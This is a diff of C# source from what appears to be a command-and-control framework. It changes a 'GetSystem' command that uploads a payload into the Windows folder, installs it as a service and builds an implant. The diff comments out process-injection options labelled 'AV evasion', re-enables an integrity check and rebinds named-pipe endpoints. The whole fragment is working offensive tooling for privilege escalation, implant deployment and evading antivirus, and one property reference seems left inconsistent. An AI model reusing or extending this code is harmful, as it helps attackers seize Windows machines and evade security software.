@@ -50,15 +50,15 @@ namespace Commander.Commands.Composite
              new Option<string>(new[] { "--file", "-f" }, () => null,"Name of payload."),
              new Option<string>(new[] { "--service", "-s" }, () => "syssvc","Name of service."),
              new Option<string>(new[] { "--path", "-p" }, () => "c:\\windows","Name of the folder to upload the payload."),
-             new Option(new[] { "--inject", "-i" }, "Îf the payload should be an injector"),
-             new Option<int>(new[] { "--injectDelay", "-id" },() => 30, "Delay before injection (AV evasion)"),
-             new Option<string>(new[] { "--injectProcess", "-ip" },() => null, "Process path used for injection"),
+             //new Option(new[] { "--inject", "-i" }, "Îf the payload should be an injector"),
+             //new Option<int>(new[] { "--injectDelay", "-id" },() => 30, "Delay before injection (AV evasion)"),
+             //new Option<string>(new[] { "--injectProcess", "-ip" },() => null, "Process path used for injection"),
              new Option(new[] { "--x86", "-x86" }, "Generate a x86 architecture executable"),
         };
 
         protected override void Run(ScriptingAgent<GetSystemCommandOptions> agent, ScriptingCommander<GetSystemCommandOptions> commander, ScriptingTeamServer<GetSystemCommandOptions> teamServer, GetSystemCommandOptions options, CommanderConfig config)
         {
-            /*if (agent.Metadata.Integrity != Shared.IntegrityLevel.High)
+            if (agent.Metadata.Integrity != Shared.IntegrityLevel.High)
             {
                 commander.WriteError($"[X] Agent should be in High integrity context!");
                 return;
@@ -66,7 +66,7 @@ namespace Commander.Commands.Composite
 
             if (string.IsNullOrEmpty(options.endpoint))
             {
-                options.endpoint = $"pipe://127.0.0.1:{options.pipe}";
+                options.endpoint = $"pipe://*:{options.pipe}";
                 commander.WriteLine($"No Endpoint selected, taking the current agent enpoint ({options.endpoint})");
             }
 
@@ -83,10 +83,10 @@ namespace Commander.Commands.Composite
                 Endpoint = endpoint,
                 IsDebug = false,
                 IsVerbose = options.verbose,
-                ServerKey = config.ServerConfig.Key,
-                Type = ImplantType.Service,
-                InjectionDelay = options.injectDelay,
-                IsInjected = options.inject,
+                //ServerKey = config.ServerConfig.Key,
+                //Type = ImplantType.Service,
+                //InjectionDelay = options.injectDelay,
+                //IsInjected = options.inject,
                 InjectionProcess = options.injectProcess
             };
 
@@ -138,12 +138,12 @@ namespace Commander.Commands.Composite
             if (endpoint.Protocol == ConnexionType.NamedPipe)
             {
                 agent.Echo($"Linking to {endpoint}");
-                var targetEndPoint = ConnexionUrl.FromString($"rpipe://127.0.0.1:{options.pipe}");
+                var targetEndPoint = ConnexionUrl.FromString($"pipe://127.0.0.1:{options.pipe}");
                 agent.Link(targetEndPoint);
             }
 
-            if (options.inject)
-                commander.WriteInfo($"Due to AV evasion, agent can take a couple of minutes to check-in...");*/
+            //if (options.inject)
+            //    commander.WriteInfo($"Due to AV evasion, agent can take a couple of minutes to check-in...");
         }
     }
 }
